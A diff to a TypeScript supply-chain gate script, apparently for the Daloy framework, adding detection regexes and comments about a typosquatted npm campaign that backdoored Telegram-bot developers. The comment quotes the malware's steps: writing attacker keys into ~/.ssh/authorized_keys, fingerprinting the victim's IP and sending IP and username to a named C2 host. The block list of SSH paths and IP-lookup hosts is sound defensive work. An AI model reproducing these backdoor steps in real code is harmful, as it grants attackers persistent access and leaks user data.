@@ -95,6 +95,47 @@
  * fetched `axios` is moot when there's no `.node_modules` path
  * injection to make it resolvable.
  *
+ * ---
+ *
+ * **Telegram-bot SSH-backdoor extension (Socket 2025-04-18):**
+ * https://socket.dev/blog/npm-malware-targets-telegram-bot-developers
+ *
+ * Three typosquatted npm packages (`node-telegram-utils`,
+ * `node-telegram-bots-api`, `node-telegram-util`) impersonated the
+ * legitimate `node-telegram-bot-api` and, on Linux only, called an
+ * `addBotId()` routine from the library constructor that:
+ *
+ *   1. `fs.mkdirSync(path.join(os.homedir(), ".ssh"), { mode: 0o700 })`
+ *      and `fs.appendFileSync(path.join(os.homedir(),
+ *      ".ssh/authorized_keys"), publicKey)` — wrote two attacker SSH
+ *      public keys into the consumer's `~/.ssh/authorized_keys`,
+ *      granting persistent passwordless SSH login that survives
+ *      uninstalling the package.
+ *   2. `https.get("https://ipinfo.io/ip", ...)` — used a public
+ *      IP-discovery endpoint to fingerprint the victim's external IP
+ *      address as a DNS-less host-mapping step.
+ *   3. `https.get("https://solana.validator.blog/v1/check?ip=" + ip +
+ *      "&name=" + os.userInfo().username)` — POSTed the external IP
+ *      and Unix username to a registered C2 domain disguised as a
+ *      Solana validator analytics host, confirming the compromise.
+ *
+ * None of these primitives touch `child_process`, `vm`, `eval`,
+ * `new Function`, or a remote `import()`, so the upstream
+ * `verify-no-remote-exec` gate does NOT see them. They also don't
+ * disable TLS or mutate HOME, so the upstream GemStuffer-class gates
+ * above don't see them either. Daloy's runtime source has no
+ * legitimate reason to ever touch `~/.ssh/`, `authorized_keys`,
+ * `ipinfo.io/ip` (or its peers `icanhazip.com` / `ifconfig.me` /
+ * `api.ipify.org` / `checkip.amazonaws.com`), or the documented
+ * `solana.validator.blog` C2 host, so this gate refuses each as a
+ * bare-literal IOC. Combined with `minimum-release-age=1440` and
+ * `ignore-scripts=true` (which keep the typosquats from running on
+ * `pnpm install`) and `verify-no-runtime-deps` (which keeps `@daloyjs/core`
+ * at zero runtime deps, so a typosquat of one of our transitive deps
+ * cannot exist), a malicious republish of `@daloyjs/core` itself has
+ * no channel left to drop in an `addBotId()`-shape SSH-key-injection
+ * backdoor.
+ *
  * @since 0.50.0
  */
 
@@ -332,6 +373,106 @@ const FORBIDDEN_PATTERNS: readonly ForbiddenPattern[] = [
       "any reference in `src/**` is a hard IOC",
     keepStrings: true,
   },
+  // ---- Telegram-bot SSH-backdoor supply-chain compromise (Socket
+  //      2025-04-18, https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) ----
+  //
+  // The typosquatted `node-telegram-utils` / `node-telegram-bots-api` /
+  // `node-telegram-util` packages injected attacker SSH public keys
+  // into `~/.ssh/authorized_keys` and exfiltrated the victim's external
+  // IP + Unix username to a registered C2 host disguised as a Solana
+  // validator analytics endpoint. The primitives below are the
+  // bare-literal IOCs; none have a legitimate use inside a web
+  // framework's runtime source.
+  {
+    // The exact file the attack appends attacker SSH public keys to.
+    // Daloy core has no legitimate reason to touch it.
+    re: /\bauthorized_keys\b/,
+    reason:
+      "`authorized_keys` is the file the Telegram-bot SSH-backdoor class appends attacker-controlled " +
+      "SSH public keys to in order to gain persistent passwordless SSH access to the consumer's host " +
+      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); library code must never " +
+      "reference this filename",
+    keepStrings: true,
+  },
+  {
+    // Reference to the user's `.ssh/` directory. Daloy never touches
+    // it; the SSH-backdoor class mkdir's it to drop an
+    // `authorized_keys` file when it doesn't exist yet.
+    re: /[\\/]\.ssh[\\/]/,
+    reason:
+      "library code must not reference `~/.ssh/` — Daloy never touches the user's SSH key directory, " +
+      "and the Telegram-bot SSH-backdoor class mkdirs this path to plant an `authorized_keys` file " +
+      "for persistent passwordless remote login " +
+      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers)",
+    keepStrings: true,
+  },
+  {
+    // The documented Telegram-bot SSH-backdoor C2 host.
+    re: /\bsolana\.validator\.blog\b/i,
+    reason:
+      "`solana.validator.blog` is the documented C2 host for the Telegram-bot SSH-backdoor npm " +
+      "campaign (`node-telegram-utils` / `node-telegram-bots-api` / `node-telegram-util`); the " +
+      "malicious `addBotId()` constructor routine POSTed the victim's external IP and Unix username " +
+      "to `https://solana.validator.blog/v1/check?ip=…&name=…` " +
+      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers) — any reference in " +
+      "`src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    // Public IP-discovery endpoints. These are the DNS-less host
+    // mapping primitives malicious packages use to fingerprint a
+    // victim's external IP without resolving the C2 host directly.
+    // `ipinfo.io/ip` was the documented Telegram-bot variant; the
+    // peer hosts below (`icanhazip.com`, `ifconfig.me`, `api.ipify.org`,
+    // `checkip.amazonaws.com`) are the same tradecraft used by other
+    // npm-malware campaigns. None of them have a legitimate use inside
+    // a backend HTTP framework — a real Daloy app that needs the
+    // client IP reads it from request headers, not a public lookup.
+    re: /\bipinfo\.io\/ip\b/i,
+    reason:
+      "`ipinfo.io/ip` is the public IP-discovery endpoint the Telegram-bot SSH-backdoor class " +
+      "fingerprinted victims with before exfiltrating to its C2 host " +
+      "(https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
+      "framework reads the client IP from request headers, never a public lookup — any reference " +
+      "in `src/**` is a hard IOC",
+    keepStrings: true,
+  },
+  {
+    re: /\bicanhazip\.com\b/i,
+    reason:
+      "`icanhazip.com` is a public IP-discovery endpoint used by npm-malware campaigns to " +
+      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
+      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
+      "framework reads the client IP from request headers, never a public lookup",
+    keepStrings: true,
+  },
+  {
+    re: /\bifconfig\.me\b/i,
+    reason:
+      "`ifconfig.me` is a public IP-discovery endpoint used by npm-malware campaigns to " +
+      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
+      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
+      "framework reads the client IP from request headers, never a public lookup",
+    keepStrings: true,
+  },
+  {
+    re: /\bapi\.ipify\.org\b/i,
+    reason:
+      "`api.ipify.org` is a public IP-discovery endpoint used by npm-malware campaigns to " +
+      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
+      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
+      "framework reads the client IP from request headers, never a public lookup",
+    keepStrings: true,
+  },
+  {
+    re: /\bcheckip\.amazonaws\.com\b/i,
+    reason:
+      "`checkip.amazonaws.com` is a public IP-discovery endpoint used by npm-malware campaigns to " +
+      "fingerprint victims (Telegram-bot SSH-backdoor class, " +
+      "https://socket.dev/blog/npm-malware-targets-telegram-bot-developers); a backend HTTP " +
+      "framework reads the client IP from request headers, never a public lookup",
+    keepStrings: true,
+  },
 ];
 
 const STRING_LITERAL_RE = /"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g;
@@ -465,13 +606,18 @@ async function main(): Promise<void> {
         "Jade Sleet paired-package token-handoff dir), name the `npmjsregister.com` C2 host, alias " +
         "`require` through a `global.*` binding, mutate `module.paths`, reference a `.node_modules` " +
         "hidden install dir, embed raw-IPv4 `http(s)://` / `ws(s)://` URLs / the documented " +
-        "RATatouille C2 IP `85.239.62.36`, or name the `0x9c.xyz` exfiltration host (xrpl.js / Ripple " +
-        "SDK April 2025 compromise). These are the runtime primitives the GemStuffer, Lazarus / Jade " +
-        "Sleet, RATatouille / rand-user-agent, and xrpl.js / Ripple-SDK classes of supply-chain " +
-        "attack use to scrape and exfiltrate data. See https://socket.dev/blog/gemstuffer, " +
+        "RATatouille C2 IP `85.239.62.36`, name the `0x9c.xyz` exfiltration host (xrpl.js / Ripple " +
+        "SDK April 2025 compromise), reference `authorized_keys` / `~/.ssh/`, name the " +
+        "`solana.validator.blog` C2 host (Telegram-bot SSH-backdoor class), or call public " +
+        "IP-discovery endpoints (`ipinfo.io/ip`, `icanhazip.com`, `ifconfig.me`, `api.ipify.org`, " +
+        "`checkip.amazonaws.com`). These are the runtime primitives the GemStuffer, Lazarus / Jade " +
+        "Sleet, RATatouille / rand-user-agent, xrpl.js / Ripple-SDK, and Telegram-bot SSH-backdoor " +
+        "classes of supply-chain attack use to scrape and exfiltrate data. See " +
+        "https://socket.dev/blog/gemstuffer, " +
         "https://socket.dev/blog/social-engineering-campaign-npm-malware, " +
         "https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise, " +
-        "and https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor.",
+        "https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor, " +
+        "and https://socket.dev/blog/npm-malware-targets-telegram-bot-developers.",
     );
     process.exitCode = 1;
   }
